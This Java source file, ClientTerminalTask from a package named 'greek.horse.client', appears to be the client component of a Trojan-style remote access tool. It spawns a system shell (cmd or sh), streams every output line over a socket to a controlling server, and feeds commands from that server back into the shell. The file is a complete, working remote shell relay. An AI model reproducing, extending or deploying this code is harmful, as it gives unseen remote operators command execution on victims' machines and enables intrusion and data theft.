package greek.horse.client;

import greek.horse.models.FunctionTicket;
import org.apache.commons.lang3.SystemUtils;
import org.apache.log4j.Logger;

import java.util.HashMap;
import java.util.Scanner;

public class ClientTerminalTask implements Runnable {
    private final ClientSocketManager client;
    private FunctionTicket ticket;
    private Process process;

    private static final Logger log = Logger.getLogger(ClientTerminalTask.class);

    public ClientTerminalTask(ClientSocketManager clientSocketManager) {
        this.client = clientSocketManager;
    }

    @Override
    public void run() {
        try {
            while (this.client.getRunning().get()) {
                if (ticket != null && this.client.getFixedMap().containsKey(ticket)) {

                    Runtime r = Runtime.getRuntime();
                    String exec = SystemUtils.IS_OS_WINDOWS ? "cmd  /k " : "sh ";
                    process = r.exec(exec);

                    sendCommand(SystemUtils.IS_OS_WINDOWS ? "" : "pwd");

                    Thread thread = new Thread(() -> {
                        try (Scanner s = new Scanner(process.getInputStream())) {
                            while (this.client.getRunning().get() && this.client.getFixedMap().containsKey(ticket)) {
                                String line = s.nextLine();
                                HashMap<FunctionTicket, Object> answerMap = new HashMap<>();
                                answerMap.put(this.ticket, line);
                                client.getOos().getAcquire().writeObject(answerMap);
                                client.getOos().getAcquire().flush();
                            }
                        } catch (Exception e) {
                            log.error("Error reading terminal output", e);
                        }
                    });

                    thread.start();
                    while (process.isAlive() && this.client.getRunning().get() && this.client.getFixedMap().containsKey(ticket)){
                        Thread.sleep(200);
                    }
                    thread.interrupt();

                }
                Thread.sleep(500);
            }
        } catch (Exception e) {
            log.error("Error in terminal task",e);
        }

    }

    public void setTicket(FunctionTicket ticket) {
        this.ticket = ticket;
    }

    public void sendCommand(String command) {
        try {
            if (process != null) {
                process.getOutputStream().write(command.concat("\n").getBytes());
                process.getOutputStream().flush();
            }
        } catch (Exception e) {
            log.error("Error sending command to terminal", e);
        }


    }
}
